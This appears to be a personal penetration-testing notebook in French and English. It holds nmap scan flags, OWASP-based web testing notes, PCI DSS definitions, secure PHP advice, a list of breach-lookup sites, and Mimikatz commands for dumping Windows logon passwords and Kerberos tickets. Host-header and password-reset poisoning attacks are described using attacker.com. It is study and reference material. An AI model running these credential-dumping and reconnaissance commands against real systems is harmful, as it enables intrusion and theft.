+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+

## 

-   ## BB - Information Disclosure/gathering :

+-----------------------------------------------------------------------+
| -   **Nmap :**                                                        |
|                                                                       |
|   ----                                                                |
| --------------------------------------------------------------------- |
|   **nmap 123.123.123.1/24**               **plage d'adresse**         |
|   ----                                                                |
| ----------------------------------- --------------------------------- |
|   **n                                                                 |
| map -sn 123.123.123.1**              **If you just want to find which |
|                                           hosts are alive**           |
|                                                                       |
|   **n                                                                 |
| map -Pn host**                       **Sometimes, hosts don't respond |
|                                                                       |
|                                      to ping. To skip ping checks and |
|                                                                       |
|                                      just scan the host ports anyway, |
|                                           use -Pn.**                  |
|                                                                       |
|   **n                                                                 |
| map -iL ./hosts.txt**                **To scan a list of hosts from a |
|                                           file**                      |
|                                                                       |
|   **-sS**                                 **TCP SYN scan. This is the |
|                                                                       |
|                                         default scan type. Other scan |
|                                                                       |
|                                       types can be useful for stealth |
|                                                                       |
|                                          or probing firewalls but may |
|                                                                       |
|                                         sacrifice accuracy or speed** |
|                                                                       |
|   **-sU**                                 **UDP ports scan**          |
|                                                                       |
|   **n                                                                 |
| map -p 1--65535 host**               **You can specify which ports to |
|                                           scan with**                 |
|                                                                       |
|   **nmap -p                               **Pour attaquer EDRA cette  |
|   23,23,25,110,80--90,U:53,1000--2000**   dinde**                     |
|                                                                       |
|   **                                                                  |
| nmap -sV --- version-intensity 9**    **When Nmap finds an open port, |
|                                                                       |
|                                      it can probe further to discover |
|                                                                       |
|                                     what service it is running if you |
|                                                                       |
|                                          specify -sV. You can set how |
|                                                                       |
|                                     intense you want the probes to be |
|                                                                       |
|                                     from 0 (light probe, fast but not |
|                                                                       |
|                                       accurate) to 9 (try all probes, |
|                                           slow but accurate)**        |
|                                                                       |
|                                                                       |
| **nmap -O host**                        **operating system guessing** |
|                                                                       |
|                                                                       |
|                                       **You can also adjust the speed |
|                                           that nmap scans at. using   |
|                                           -T\<0--5\>**                |
|                                                                       |
|                                                                       |
|                                                                       |
|                                                                       |
|                                                                       |
|                                                                       |
|   ----                                                                |
| --------------------------------------------------------------------- |
+=======================================================================+
| -   **Burp Crawler**                                                  |
+-----------------------------------------------------------------------+
| -   **ffuf**                                                          |
|                                                                       |
|     -                                                                 |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

## 

-   ## BB - Business logic vulnerabilities :

+-----------------------------------------------------------------------+
| -   **Valeurs négatives**                                             |
+=======================================================================+
| -   **Changer le type de la variable**                                |
+-----------------------------------------------------------------------+
| -   **Dépasser des limites sur les valeurs des variables**            |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - GraphQL :

+-----------------------------------------------------------------------+
| -   **Inject Introspection schéma**                                   |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

-   ## BB - APK :![](media/image254.png){width="5.791338582677166in" height="4.541666666666667in"}

# 

-   # Non technique, normes, \...

## PCI DSS

-   **L'acronyme PCI DSS (Payment Card Industry Data Security Standard)
    > désigne les normes de sécurité des données applicables à
    > l'industrie des cartes de paiement. Élaborée par le conseil des
    > normes de sécurité PCI, la norme PCI DSS vise à réduire la fraude
    > en ligne. Toute organisation qui traite les données de titulaires
    > de cartes de paiement est tenue de s'y conformer. La conformité
    > est validée par un évaluateur de sécurité homologué, un évaluateur
    > de la sécurité en interne, ou par le biais d'un questionnaire
    > d'auto-évaluation pour les entreprises qui traitent de plus petits
    > volumes de données de cartes bancaires.**

> **La norme PCI DSS est une norme mondiale qui n'est pas obligatoire au
> regard de la loi aux États-Unis --- la réglementation applicable aux
> données des titulaires de cartes diffère d'un état à l'autre, et la
> non-conformité se traduit le plus souvent par de lourdes amendes pour
> l'entreprise concernée.**
>
> **Pourquoi la norme PCI DSS est-elle si importante ?**
>
> **En appliquant la norme PCI DSS, votre entreprise indique prendre les
> mesures appropriées pour protéger les données des titulaires de cartes
> contre le vol sur Internet et toute utilisation frauduleuse. L'impact
> est aussi fort pour l'entreprise que pour ses clients, car les
> conséquences d'une cyberattaque peuvent se traduire par une perte de
> revenus, de clients et de confiance, sans parler du préjudice pour la
> marque.**

-   **L'acronyme PSSI (Politique de sécurité du système d\'information)
    > définit l'intégralité de la stratégie de sécurité informatique de
    > l'entreprise. Elle se traduit par la réalisation d'un document qui
    > regroupe l'ensemble des règles de sécurité à adopter ainsi que le
    > plan d'actions ayant pour objectif de maintenir le niveau de
    > sécurité de l'information dans l'organisme.**

> **La PSSI, élaborée « sur-mesure » pour chaque établissement, décrit
> l'ensemble des enjeux, des besoins, des contraintes, ainsi que des
> règles à adopter propres à chaque structure. Elle doit être validée
> par la direction et prise en compte par chaque collaborateur.**

-   # Secure PHP Software Guideline

```{=html}
<!-- -->
```
-   ## Dependency Management

    -   In short: Use Composer.

        -   If you aren\'t using Composer to manage your dependencies,
            > you will eventually (hopefully later but most likely
            > sooner) end up in a situation where one of the software
            > libraries you depend on becomes severely outdated.

-   ## Recommended Packages

> Regardless of what you\'re building, you will almost certainly benefit
> from these dependencies. This is in addition to what most PHP
> developers recommend :

+-----------------------------------------------------------------------+
| -   roave/security-advisories                                         |
|                                                                       |
|     -   ensure that your project doesn\'t depend on any               |
|         > known-vulnerable packages.                                  |
+=======================================================================+
| -   vimeo/psalm                                                       |
|                                                                       |
|     -   Psalm is a static analysis tool that helps identify possible  |
|         > bugs in your code. Regardless of which static analysis tool |
|         > you use, we recommend you bake it into your Continuous      |
|         > Integration workflow (if applicable) so that it is run      |
|         > after every code change.                                    |
+-----------------------------------------------------------------------+

## Subresource Integrity

Subresource integrity (SRI) allows you to pin a hash of the contents of
the file you expect the CDN to serve. SRI as currently implemented only
allows the use of secure cryptographic hash functions, which means that
it\'s infeasible for an attacker to generate a malicious version of the
same resources that produce the same hash as the original file.

Example :

![](media/image256.png){width="4.697916666666667in" height="1.59375in"}

## Document Relationships

![](media/image64.png){width="4.773089457567804in"
height="4.4630260279965in"}

## Database Interaction

If you\'re writing SQL queries yourself, make sure that you\'re using
prepared statements.

If you\'re writing SQL queries yourself, make sure that you\'re using
prepared statements, and that any information provided by the network or
filesystem is passed as a parameter rather than concatenated into the
query string.

Furthermore, make sure you\'re not using emulated prepared statements.

![](media/image417.png){width="5.104166666666667in"
height="2.8229166666666665in"}

##  File Uploads

-   # Security Web Testing Guide

Based on :
[[https://owasp.org/www-project-web-security-testing-guide/v42/]{.underline}](https://owasp.org/www-project-web-security-testing-guide/v42/)

## Information Gathering

+-----------------------------------------------------------------------+
| -   ### General                                                       |
|                                                                       |
| -   Utiliser plusieurs navigateurs pour chercher des infos sur la     |
|     > cible en écrivant juste l'URL du site au minimum:               |
|                                                                       |
|     -   Google, Bing(Support SO), DuckDuckGo(Support SO), Startpage   |
|         > (Support SO), Wayback Machine                               |
|                                                                       |
|     -   Utiliser les SO                                               |
|                                                                       |
|     -   Looker les fichiers suivants pour trouver un maximum de page  |
|         > et d'info sur un site :                                     |
|                                                                       |
|         -   robots.txt                                                |
|                                                                       |
|         -   sitemap.xml                                               |
|                                                                       |
|         -   human.txt                                                 |
|                                                                       |
|         -   security.txt                                              |
|                                                                       |
|         -   .well-known/                                              |
|                                                                       |
|         -   sitemap.xml                                               |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Banner grabbing : by eliciting responses to (malformed) requests, |
|     > and examining its response header to get information about the  |
|     > type of server. Often done by automatic tools ( Nikto, Nmap,    |
|     > netcraft).                                                      |
|                                                                       |
|     -   In cases where the server information is obscured, testers    |
|         > may guess the type of server based on the ordering of the   |
|         > header fields.                                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Examining error responses                                         |
|                                                                       |
| -   Defining the version of the server and see if it's up-to-date.    |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Look through all META tag to discover different pages             |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Use Netcraft tool                                                 |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Dans le cas ou la target c'est juste une adresse IP et tu dois    |
|     > trouver des sites web venant de cette adresse :                 |
|                                                                       |
|     -   Cas 1) Differents sites venant d'URL differente               |
|         > (http://www.example.com/url1 http://www.example.com/url2    |
|         > http://www.example.com/url3) =\> assez rare                 |
|                                                                       |
|         -   See if you can directory browsing                         |
|                                                                       |
|         -   If testers suspect the existence of such hidden           |
|             > applications on www.example.com they could search using |
|             > the search operator and examine the result of a query   |
|             > for site:                                               |
|                                                                       |
|            > [[www.example.com]{.underline}](http://www.example.com). |
|                                                                       |
|         -   Dictionary-style searching (or "intelligent guessing")    |
|             > like mail or administrative interfaces, from a base URL |
|             > could yield some results. Vulnerability scanners may    |
|             > help in this respect.                                   |
|                                                                       |
|     -   Cas 2) Non-standard Ports                                     |
|                                                                       |
|         -   A port scanner such as nmap (FUZZ) : nmap --Pn --sT --sV  |
|             > --p0-65535 192.168.1.100                                |
|                                                                       |
|         -                                                             |
|                                                                       |
|     -   Cas 3) Virtual Hosts ( one IP =\> many DNS names)             |
|                                                                       |
|         -   DNS Zone Transfers                                        |
|                                                                       |
|             -   If a symbolic name is known for \[IP\] (let it be     |
|                 > www.owasp.org), its name servers can be determined  |
|                 > by means of tools such as nslookup, host, or dig,   |
|                 > by requesting DNS NS records :                      |
|                                                                       |
| > ![](media/image206.png){width="2.8541666666666665in"                |
| > height="0.7395833333333334in"}                                      |
| >                                                                     |
| > ![](media/image355.png){width="2.8645833333333335in"                |
| > height="0.21875in"}                                                 |
|                                                                       |
| -   DNS Inverse Queries ( IP =\> domain)                              |
|                                                                       |
|     -   dig -x \[IP\]                                                 |
|                                                                       |
|     -   nslookup \[IP\]                                               |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   https://hackertarget.com/reverse-ip-lookup/ =\> (very complex     |
|     > search database that has recorded the IP addresses of websites  |
|     > it has crawled)                                                 |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Bing research : ip:"\[IP\]"                                       |
|                                                                       |
|     -   Web-based DNS Searches                                        |
|                                                                       |
|         -   https://searchdns.netcraft.com/?host                      |
|                                                                       |
|     -   Reverse-IP Services                                           |
|                                                                       |
|         -   the testers query a web-based application instead of a    |
|             > name server.                                            |
|                                                                       |
|             -   https://reverseip.domaintools.com/ (requires free     |
|                 > membership)                                         |
|                                                                       |
|             -   DNSstuff (multiple services available)                |
|                                                                       |
|             -   Net Square (multiple queries on domains and IP        |
|                 > addresses, requires installation)                   |
|                                                                       |
|     -   Googling dorking                                              |
|                                                                       |
|     -   Digital Certificates                                          |
|                                                                       |
|         -   If the server accepts connections over HTTPS, then the    |
|             > Common Name (CN) and Subject Alternate Name (SAN) on    |
|             > the certificate may contain one or more hostnames.      |
|                                                                       |
| > The CN and SAN can be obtained by manually inspecting the           |
| > certificate, or through other tools such as OpenSSL:                |
|                                                                       |
| -   openssl s_client -connect 93.184.216.34:443 \</dev/null           |
|     > 2\>/dev/null \| openssl x509 -noout -text \| grep -E            |
|     > \'DNS:\|Subject:\'                                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Search for comments (Sometimes, they forget about the comments    |
|     > and they leave them in production environments.)                |
|                                                                       |
| ![](media/image286.png){width="6.1875in"                              |
| height="0.9861111111111112in"}                                        |
|                                                                       |
| -   review JS file (non library) (Look for values such as: API keys,  |
|     > internal IP addresses, sensitive routes, or credentials.)       |
|                                                                       |
| -   Identifying Source Map Files : Testers can also find source map   |
|     > files by adding the ".map" extension after the extension of     |
|     > each external JavaScript file. Check source map files for any   |
|     > sensitive information that can help the attacker gain more      |
|     > insight about the application.                                  |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Use Attack Surface Detector (Burp suite Extension tool) to        |
|     > investigates the source code and uncovers the endpoints of a    |
|     > web application                                                 |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   la plupart des éléments (presque tous) dans la catégorie          |
|     > \*\*information disclosure\*\* peuvent être effectué avec des   |
|     > tools                                                           |
|                                                                       |
| -   Looker le Header X-Powered-By ( ou autre dérivé comme             |
|     > X-Generator) pour trouver des frameworks ou applications        |
|     > utilisées                                                       |
|                                                                       |
| -   Looker le nom du cookie                                           |
|                                                                       |
| -   Looker si il y a des commentaires qui peuvent nous indiquer des   |
|     > framework ou info laissées par les devs.                        |
|                                                                       |
| -   Chercher des fichiers liées à des frameworks (FUZZ) pour trouver  |
|     > leur présence                                                   |
|                                                                       |
| -   Looker l\'extension des fichiers dans l'URL                       |
|                                                                       |
| -   Pour remédier à la découverte des frameworks utilisés d'un point  |
|     > de vue des Hackers, on essaye de tout cacher comme information. |
|     > Mais c'est plus pour le freiner qu'un vrai moyen de sécurité.   |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Autour du serveur web, essayer de trouver tous les éléments       |
|     > connectés à lui (reverse proxy, base de données, ...) pour      |
|     > mieux comprendre la cible                                       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Outil de récup d'info : Whatweb : *./whatweb \[URL\]*             |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Use recon-ng (very cool tool for information gathering)           |
+=======================================================================+
| -   ### Shodan                                                        |
|                                                                       |
|     -                                                                 |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

## Configuration and Deployment Management Testing

+-----------------------------------------------------------------------+
| -   ### Review each version (if                                       |
|  possible) of each element related to the server web (DB, proxy, ...) |
+=======================================================================+
| -   Review if no default unsecure ( more generally unused)            |
|     > configuration component is present :                            |
|                                                                       |
|     -   Default files                                                 |
|                                                                       |
|     -   Default non-used configuration                                |
+-----------------------------------------------------------------------+
| -   Various tools, documents, or checklists (found on the internet)   |
|     > can be used to give IT and security professionals a detailed    |
|     > assessment of target systems' conformance to various            |
|     > configuration baselines or benchmarks.                          |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Configuration Review in Gray-Box Testing common guidelines for    |
|     > application server :                                            |
|                                                                       |
|     -   Only enable server modules that are needed for the            |
|         > application.                                                |
|                                                                       |
|     -   Handle server errors (40x or 50x) for with custom-made pages  |
|         > instead of with the default web server pages. Specifically, |
|         > make sure that any application errors will not be returned  |
|         > to the end user and that no code is leaked through these    |
|         > errors since it will help an attacker.                      |
|                                                                       |
| > [[https://fr.wikipedia.org/wiki/Liste_des_codes_H                   |
| TTP]{.underline}](https://fr.wikipedia.org/wiki/Liste_des_codes_HTTP) |
|                                                                       |
| -   Make sure that the server software runs with minimized privileges |
|     > in the operating system.                                        |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Make sure the server software properly logs both legitimate       |
|     > access and errors.                                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Make sure that the server is configured to properly handle        |
|     > overloads and prevent Denial of Service attacks. Ensure that    |
|     > the server has been performance-tuned properly.                 |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Logging :                                                         |
|                                                                       |
|     -   Do the logs contain sensitive information?                    |
|                                                                       |
|     -   Are the logs stored in a dedicated server?                    |
|                                                                       |
|     -   Can log usage generate a Denial of Service condition?         |
|                                                                       |
|     -   How are they rotated? Are logs kept for the sufficient time?  |
|                                                                       |
|     -   How are logs reviewed? Can administrators use these reviews   |
|         > to detect targeted attacks?                                 |
|                                                                       |
|     -   How are log backups preserved?                                |
|                                                                       |
|     -   Is the data being logged data validated (min/max length,      |
|         > chars etc) prior to being logged?                           |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Some applications might, for example, use GET requests to forward |
|     > form data which will be seen in the server logs. This means     |
|     > that server logs might contain sensitive information (such as   |
|     > usernames as passwords, or bank account details). This          |
|     > sensitive information can be misused by an attacker if they     |
|     > obtained the logs.                                              |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Also, in some jurisdictions, storing some sensitive information   |
|     > in log files, such as personal data, might oblige the           |
|     > enterprise to apply the data protection laws that they would    |
|     > apply to their back-end databases to log files too.             |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   If the server is compromised its logs can be wiped out by the     |
|     > intruder to clean up all the traces of its attack and methods.  |
|     > So, it is wiser to keep logs in a separate location and not in  |
|     > the web server itself.                                          |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Logs can introduce a Denial of Service condition if they are not  |
|     > properly stored. Typically in UNIX systems logs will be located |
|     > in /var (although some server installations might reside in     |
|     > /opt or /usr/local) and it is important to make sure that the   |
|     > directories in which logs are stored are in a separate          |
|     > partition.                                                      |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Log statistics or analysis should not be generated, nor stored,   |
|     > in the same server that produces the logs. Otherwise, an        |
|     > attacker might, through a web server vulnerability or improper  |
|     > configuration, gain access to them                              |
+-----------------------------------------------------------------------+
| -   WSTG-CONF-03                                                      |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

## Client-side Testing

+-----------------------------------------------------------------------+
| -   ### DOM XSS                                                       |
|                                                                       |
|     -   #### Test automatique :                                       |
|                                                                       |
|         -   ##### FindomXSS :                                         |
|                                                                       |
|   ------------------------------------------------------------------  |
|   ./findom-xss.sh \[URL\]                     Search sink             |
|   ------------------------------------------- ----------------------  |
|                                                                       |
|                                                                       |
|                                                                       |
|   ------------------------------------------------------------------  |
|                                                                       |
| -   ##### DOM based XSS Finder (extension CHROME) (FUZZ)              |
|                                                                       |
| > ![](media/image307.png){width="3.6458333333333335in"                |
| > height="0.90625in"}                                                 |
| >                                                                     |
| > ![](media/image263.png){width="4.041022528433945in"                 |
| > height="2.088542213473316in"}                                       |
|                                                                       |
| -   ##### DOM Invader (en ouvrant le navigateur depuis BURP)          |
|                                                                       |
| -   ##### XSStrike (FUZZ)                                             |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   #### Test manuel :                                                |
|                                                                       |
|     -   Pour chaque sink trouvé, essayer d'observer si une injection  |
|         > est possible.                                               |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

## API Testing

+-----------------------------------------------------------------------+
| -   ### GraphQL                                                       |
|                                                                       |
|     -                                                                 |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## Testing Browser Storage

+-----------------------------------------------------------------------+
| -   Look at LocalStaraoge, Sessionstorage, IndexedDB and Cookie to    |
|     > determine if there are sensitive data                           |
+=======================================================================+
| -   The code handling of the storage objects should be examined for   |
|     > possibilities of injection attacks.                             |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## Testing Web Messaging

+-----------------------------------------------------------------------+
| -   ....                                                              |
+=======================================================================+
| -   .....                                                             |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## Testing for Cross Site Script Inclusion

+-----------------------------------------------------------------------+
| -   ....                                                              |
+=======================================================================+
| -   .....                                                             |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## Testing for Host Header Injection

A web server commonly hosts several web applications on the same IP
address, referring to each application via the virtual host. In an
incoming HTTP request, web servers often dispatch the request to the
target virtual host based on the value supplied in the Host header.

+-----------------------------------------------------------------------+
| -   In general, this attack is based on the situation when the Host   |
|     > header is being parsed and used dynamically in the application  |
|     > (in the code).                                                  |
|                                                                       |
| > Example :                                                           |
| >                                                                     |
| > ![](media/image412.png){width="1.9814227909011373in"                |
| > height="0.8379582239720035in"}                                      |
| >                                                                     |
| > ![](media/image428.png){width="3.809375546806649in"                 |
| > height="0.8281255468066492in"}                                      |
|                                                                       |
| -   Initial testing is as simple as supplying another domain (i.e.    |
|     > attacker.com).                                                  |
|                                                                       |
| > The attack is valid when the web server processes the input to send |
| > the request to an attacker-controlled host that resides at the      |
| > supplied domain, and not to an internal virtual host that resides   |
| > on the web server.                                                  |
| >                                                                     |
| > Some intercepting proxies derive the target IP address from the     |
| > Host header directly, which makes this kind of testing all but      |
| > impossible                                                          |
+=======================================================================+
| -   X-Forwarded Host Header Bypass :                                  |
|                                                                       |
| > ![](media/image172.png){width="4.033506124234471in"                 |
| > height="1.2383573928258969in"}                                      |
| >                                                                     |
| > X-Forwarded-Host, Forwarded, X-HTTP-Host-Override,                  |
| > X-Forwarded-Server, X-Host                                          |
+-----------------------------------------------------------------------+
| -   Password Reset Poisoning                                          |
|                                                                       |
| > It is common for password reset functionality to include the Host   |
| > header value when creating password reset links that use a          |
| > generated secret token.                                             |
| >                                                                     |
| > If the application processes an attacker-controlled domain to       |
| > create a password reset link, the victim may click on the link in   |
| > the email (by providing his email) and allow the attacker to obtain |
| > the reset token, thus resetting the victim's password.              |
| >                                                                     |
| > ![](media/image139.png){width="5.377051618547681in"                 |
| > height="1.1302088801399826in"}                                      |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## Testing for SQLi

+-----------------------------------------------------------------------+
| -   For SQL Injection Auth Bypass, test all payloads from a specific  |
|     > wordlist related to this situation with burp. (FUZZ)            |
+=======================================================================+
| -   For SQL Injection in general, try Time based directly for         |
|     > detection, from related wordlist. (FUZZ)                        |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

Data Breach

## Search Engine

-   Intelligence X -
    > [[https://intelx.io]{.underline}](https://intelx.io)

-   leakcheck -
    > [[https://leakcheck.io]{.underline}](https://leakcheck.io)

-   weleakinfo -
    > [[https://weleakinfo.to]{.underline}](https://weleakinfo.to)

-   leakpeek -
    > [[https://leakpeek.com]{.underline}](https://leakpeek.com)

-   snusbase -
    > [[https://snusbase.com]{.underline}](https://snusbase.com)

-   GlobaLeaks -
    > [[https://www.globaleaks.org/]{.underline}](https://www.globaleaks.org/)

-   Firefox Monitor -
    > [[https://monitor.firefox.com/]{.underline}](https://monitor.firefox.com/)

-   haveibeenpwned? -
    > [[https://haveibeenpwned.com/]{.underline}](https://haveibeenpwned.com/)

-   ScatteredSecrets -
    > [[https://scatteredsecrets.com/]{.underline}](https://scatteredsecrets.com/)

-   AmIBreched -
    > [[https://amibreached.com]{.underline}](https://amibreached.com)

-   Leak Lookup -
    > [[https://leak-lookup.com]{.underline}](https://leak-lookup.com)

-   Breach Checker -
    > [[https://breachchecker.com]{.underline}](https://breachchecker.com)

-   RSLookup -
    > [[https://rslookup.com]{.underline}](https://rslookup.com)

-   Breachdirectory -
    > [[https://breachdirectory.org/]{.underline}](https://breachdirectory.org/)

-   Avast -
    > [[https://www.avast.com/hackcheck]{.underline}](https://www.avast.com/hackcheck)

Windows Pentest

# Mimicatz 

  -----------------------------------------------------------------------
  Privilege check                     privilege::debug
  ----------------------------------- -----------------------------------
  Log                                 log logpath.log

  -----------------------------------------------------------------------

Sekurlsa

  -----------------------------------------------------------------------
                                      sekurlsa::logonpasswords
  ----------------------------------- -----------------------------------
                                      sekurlsa::logonPasswords full

                                      sekurlsa::tickets /export
  -----------------------------------------------------------------------

Kerberos

  ----------------------------------- -----------------------------------
                                      

                                      
  ----------------------------------- -----------------------------------
